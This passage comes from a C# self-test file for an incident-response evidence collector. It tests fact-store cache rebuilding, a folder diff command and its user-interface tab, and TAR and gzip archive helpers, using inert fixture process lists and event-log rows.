                FactStoreBuildResult first = FactStoreBuildCoordinator.Build(firstCase, true, true, cache);
                if (first.Store == null || first.BuildMode != "Full" || !File.Exists(first.CachePath))
                    return false;

                File.WriteAllText(first.CachePath, "not-a-gzip-cache", new UTF8Encoding(false));
                CaseData secondCase = CreateFactStoreCacheCase(evidence, Path.Combine(work, "analysis2"));
                FactStoreBuildResult second = FactStoreBuildCoordinator.Build(secondCase, true, false, cache);
                return second.Store != null &&
                    second.Store.Count == first.Store.Count &&
                    second.BuildMode == "Full" &&
                    second.Detail.IndexOf("could not be read", StringComparison.OrdinalIgnoreCase) >= 0;
            }
            finally
            {
                TryDeleteDir(work);
            }
        }

        private static bool FactStoreAutoBuild_rebuilds_stale_store()
        {
            var c = new CaseData
            {
                FactStore = new FactStore(),
                FactStoreFreshnessStatus = "fresh"
            };
            c.FactStore.AppendFacts(new[]
            {
                new Fact("cache-test", DateTime.UtcNow, "Process", "Observed")
            });

            if (IR_Collect.MainForm.ShouldAutoBuildFactStore("0", c)) return false;
            if (IR_Collect.MainForm.ShouldAutoBuildFactStore("1", c)) return false;
            c.FactStoreFreshnessStatus = "stale";
            return IR_Collect.MainForm.ShouldAutoBuildFactStore("1", c);
        }

        private static void WriteFactStoreCacheFixtures(string evidence, bool addEvent, bool addProcess)
        {
            string processHeader = "PID,Name,Path,CommandLine,StartTime,User,SHA256,SignatureStatus,Signer,PPID,SessionId,ThreadCount,WorkingSetSize\r\n";
            string processRows = "100,good.exe,C:\\Windows\\good.exe,C:\\Windows\\good.exe,2026-01-01 00:00:00,SYSTEM,,,,,,,\r\n";
            if (addProcess)
                processRows += "200,new.exe,C:\\Temp\\new.exe,C:\\Temp\\new.exe,2026-01-01 00:10:00,user,,,,,,,\r\n";
            File.WriteAllText(Path.Combine(evidence, ArtifactNames.ProcessListCsv), processHeader + processRows, new UTF8Encoding(false));

            string eventDir = Path.Combine(evidence, "EventLogs");
            Directory.CreateDirectory(eventDir);
            var rows = new List<string[]>
            {
                BuildEventLogRow("2026-01-01T00:01:00Z", "1102", "Microsoft-Windows-Security-Auditing", "Audit log cleared.", "")
            };
            if (addEvent)
                rows.Add(BuildEventLogRow("2026-01-01T00:02:00Z", "4624", "Microsoft-Windows-Security-Auditing", "Logon.", "TargetUserName=alice"));
            WriteEventLogCsv(Path.Combine(eventDir, "Security_filtered.csv"), rows);
        }

        private static CaseData CreateFactStoreCacheCase(string evidence, string analysis)
        {
            Directory.CreateDirectory(analysis);
            EvidenceManifestResult manifest = EvidenceManifest.HashFolder(evidence);
            var c = new CaseData
            {
                CaseID = "cache-case",
                Hostname = "CACHE-HOST",
                ExtractPath = evidence,
                EvidencePath = evidence,
                AnalysisPath = analysis,
                CachePath = analysis,
                SourceFormat = "folder",
                EvidenceFiles = manifest.Files,
                EvidenceDigest = manifest.Digest
            };
            string process = Path.Combine(evidence, ArtifactNames.ProcessListCsv);
            string eventLog = Path.Combine(evidence, "EventLogs", "Security_filtered.csv");
            c.Artifacts[ArtifactNames.ProcessListCsv] = process;
            c.Artifacts[Path.Combine("EventLogs", "Security_filtered.csv")] = eventLog;
            return c;
        }

        private static bool DiffCli_compares_readonly_folders_and_writes_diff_v1()
        {
            string work = Path.Combine(Path.GetTempPath(), "IRCollectDiffCli_" + Guid.NewGuid().ToString("N"));
            string baseline = Path.Combine(work, "baseline");
            string target = Path.Combine(work, "target");
            string output = Path.Combine(work, "diff.json");
            try
            {
                Directory.CreateDirectory(baseline);
                Directory.CreateDirectory(target);
                File.WriteAllText(Path.Combine(baseline, ArtifactNames.SystemInfoTxt), "Hostname: diff-host\r\nOS: Windows", new UTF8Encoding(false));
                File.WriteAllText(Path.Combine(target, ArtifactNames.SystemInfoTxt), "Hostname: diff-host\r\nOS: Windows", new UTF8Encoding(false));
                string header = "PID,Name,Path,CommandLine,StartTime,User,SHA256,SignatureStatus,Signer,PPID,SessionId,ThreadCount,WorkingSetSize\r\n";
                string common = "100,good.exe,C:\\Windows\\good.exe,C:\\Windows\\good.exe,2026-01-01 00:00:00,SYSTEM,,,,,,,\r\n";
                string added = "200,evil.exe,C:\\Temp\\evil.exe,C:\\Temp\\evil.exe -x,2026-01-01 01:00:00,analyst," +
                    new string('b', 64) + ",,,,,,\r\n";
                File.WriteAllText(Path.Combine(baseline, ArtifactNames.ProcessListCsv), header + common, new UTF8Encoding(false));
                File.WriteAllText(Path.Combine(target, ArtifactNames.ProcessListCsv), header + common + added, new UTF8Encoding(false));

                string baselineDigestBefore = EvidenceManifest.HashFolder(baseline).Digest;
                string targetDigestBefore = EvidenceManifest.HashFolder(target).Digest;
                var console = new StringWriter();
                int result = DiffCli.Run(baseline, target, output, console);
                if (result != 0 || !File.Exists(output)) return false;
                string json = File.ReadAllText(output, Encoding.UTF8);
                if (json.IndexOf("\"diff_schema\":\"diff_v1\"", StringComparison.Ordinal) < 0) return false;
                if (json.IndexOf("evil.exe", StringComparison.OrdinalIgnoreCase) < 0) return false;
                if (json.IndexOf("\"change_type\":\"Added\"", StringComparison.Ordinal) < 0) return false;
                if (json.IndexOf("\"collection_coverage_status\"", StringComparison.Ordinal) < 0) return false;
                if (json.IndexOf("\"parse_level\"", StringComparison.Ordinal) < 0) return false;
                return baselineDigestBefore == EvidenceManifest.HashFolder(baseline).Digest &&
                    targetDigestBefore == EvidenceManifest.HashFolder(target).Digest;
            }
            finally
            {
                TryDeleteDir(work);
            }
        }

        private static bool DiffTab_builds_grid_from_loaded_ready_baseline()
        {
            MainForm form = null;
            try
            {
                CaseData baseline = CreateDiffCase("ui-baseline");
                CaseData target = CreateDiffCase("ui-target");
                baseline.FactStore.Facts.Add(CreateDiffFact("svc", "Service", "ServiceConfigurationObserved", "ServiceName", "SvcA", "StartMode=Manual"));
                target.FactStore.Facts.Add(CreateDiffFact("svc", "Service", "ServiceConfigurationObserved", "ServiceName", "SvcA", "StartMode=Auto"));
                target.FactStore.Facts.Add(CreateDiffFact("proc", "Process", "Executed", "Path", @"C:\Temp\new.exe", "new"));

                form = new MainForm();
                FieldInfo treeField = typeof(MainForm).GetField("treeHosts", BindingFlags.NonPublic | BindingFlags.Instance);
                if (treeField == null) return false;
                TreeView tree = treeField.GetValue(form) as TreeView;
                if (tree == null) return false;
                tree.Nodes.Add(new TreeNode("baseline") { Tag = baseline });
                tree.Nodes.Add(new TreeNode("target") { Tag = target });

                MethodInfo method = typeof(MainForm).GetMethod("CreateDiffTab", BindingFlags.NonPublic | BindingFlags.Instance);
                if (method == null) return false;
                TabPage tab = method.Invoke(form, new object[] { target }) as TabPage;
                DataGridView grid = FindDescendantControl<DataGridView>(tab);
                if (tab == null || grid == null || !string.Equals(tab.Text, "Diff", StringComparison.Ordinal)) return false;
                if (grid.Rows.Count != 2) return false;
                var changes = grid.Rows.Cast<DataGridViewRow>()
                    .Select(row => row.Tag as DiffChange)
                    .Where(change => change != null)
                    .ToList();
                return changes.Count == 2 &&
                    changes.Any(change => change.ChangeType == "Added" && change.Category == "Process") &&
                    changes.Any(change => change.ChangeType == "Modified" && change.Category == "Persistence");
            }
            finally
            {
                if (form != null) form.Dispose();
            }
        }

        private static CaseData CreateDiffCase(string id)
        {
            return new CaseData
            {
                CaseID = id,
                Hostname = "diff-host",
                EvidenceDigest = id + "-digest",
                SourceFormat = "folder",
                CollectionCoverage = new CollectionCoverageReport { OverallStatus = "complete" },
                FactStore = new FactStore { CaseId = id, Hostname = "diff-host" }
            };
        }

        private static Fact CreateDiffFact(
            string id,
            string source,
            string action,
            string entityType,
            string entityValue,
            string details)
        {
            var fact = new Fact(id, DateTime.MinValue, source, action)
            {
                Details = details,
                SourceFile = source + ".csv",
                RawRef = source + ".csv:2",
                CollectionStep = source,
                CollectionStatus = "complete",
                CollectionPrivilege = "standard",
                ParseLevel = FactProvenanceMetadata.StructuredParseLevel,
                ParserNote = "fixture"
            };
            fact.AddEntity(entityType, entityValue);
            return fact;
        }

        private static bool HasDiffChange(DiffReport report, string category, string changeType, string entityKey)
        {
            return report != null && report.Changes != null && report.Changes.Any(x =>
                string.Equals(x.Category, category, StringComparison.Ordinal) &&
                string.Equals(x.ChangeType, changeType, StringComparison.Ordinal) &&
                string.Equals(x.EntityKey, entityKey, StringComparison.OrdinalIgnoreCase));
        }

        private static void WriteTarGzFromFolder(string root, string archivePath)
        {
            using (FileStream file = new FileStream(archivePath, FileMode.Create, FileAccess.Write, FileShare.None))
            using (GZipStream gzip = new GZipStream(file, CompressionMode.Compress))
            {
                string rootFull = Path.GetFullPath(root).TrimEnd(Path.DirectorySeparatorChar, '/', '\\') + Path.DirectorySeparatorChar;
                foreach (string path in Directory.EnumerateFiles(root, "*", SearchOption.AllDirectories).OrderBy(x => x, StringComparer.OrdinalIgnoreCase))
                {
                    string full = Path.GetFullPath(path);
                    string relative = full.Substring(rootFull.Length).Replace('\\', '/');
                    WriteTarEntry(gzip, relative, File.ReadAllBytes(path));
                }
                gzip.Write(new byte[1024], 0, 1024);
            }
        }

        private static void WriteSingleTarGzEntry(string archivePath, string entryName, byte[] content)
        {
            using (FileStream file = new FileStream(archivePath, FileMode.Create, FileAccess.Write, FileShare.None))
            using (GZipStream gzip = new GZipStream(file, CompressionMode.Compress))
            {
                WriteTarEntry(gzip, entryName, content ?? new byte[0]);
                gzip.Write(new byte[1024], 0, 1024);
            }
        }

        private static void WriteTarEntry(Stream output, string name, byte[] content)
        {
            WriteTarEntry(output, name, content, '0');
        }

        private static void WriteTarEntry(Stream output, string name, byte[] content, char type)
        {
            byte[] nameBytes = Encoding.UTF8.GetBytes(name ?? "");
            if (nameBytes.Length == 0 || nameBytes.Length > 100)
                throw new InvalidOperationException("Self-test TAR entry name is outside the basic ustar limit.");

            byte[] header = new byte[512];
            Buffer.BlockCopy(nameBytes, 0, header, 0, nameBytes.Length);
            WriteTarOctal(header, 100, 8, 420);
            WriteTarOctal(header, 108, 8, 0);
            WriteTarOctal(header, 116, 8, 0);
            WriteTarOctal(header, 124, 12, content != null ? content.Length : 0);
            WriteTarOctal(header, 136, 12, 1785085200);
            for (int i = 148; i < 156; i++) header[i] = 32;
            header[156] = (byte)type;
            Encoding.ASCII.GetBytes("ustar\0").CopyTo(header, 257);
            Encoding.ASCII.GetBytes("00").CopyTo(header, 263);

            int checksum = 0;
            for (int i = 0; i < header.Length; i++) checksum += header[i];
            string checksumText = Convert.ToString(checksum, 8).PadLeft(6, '0');
            Encoding.ASCII.GetBytes(checksumText).CopyTo(header, 148);
            header[154] = 0;
            header[155] = 32;

            output.Write(header, 0, header.Length);
            if (content != null && content.Length > 0) output.Write(content, 0, content.Length);
            int remainder = content != null ? content.Length % 512 : 0;
            if (remainder != 0)
            {
                byte[] padding = new byte[512 - remainder];
                output.Write(padding, 0, padding.Length);
            }
        }

        private static byte[] BuildPaxRecord(string key, string value)
        {
            string body = (key ?? "") + "=" + (value ?? "") + "\n";
            int length = Encoding.UTF8.GetByteCount(body) + 3;
            while (true)
            {
                string prefix = length.ToString() + " ";
                int actual = Encoding.ASCII.GetByteCount(prefix) + Encoding.UTF8.GetByteCount(body);
                if (actual == length)
                    return Encoding.UTF8.GetBytes(prefix + body);
                length = actual;
            }
        }

        private static void WriteTarOctal(byte[] buffer, int offset, int length, long value)
        {
            string text = Convert.ToString(value, 8);
            if (text.Length > length - 1)
                throw new InvalidOperationException("Self-test TAR numeric field overflow.");
            text = text.PadLeft(length - 1, '0');
            Encoding.ASCII.GetBytes(text).CopyTo(buffer, offset);
            buffer[offset + length - 1] = 0;
        }

        private static void TryDeleteDir(string path)
        {
            try
            {
                if (!string.IsNullOrEmpty(path) && Directory.Exists(path))
                    Directory.Delete(path, true);
            }
            catch { }
        }
    }
}
#endif
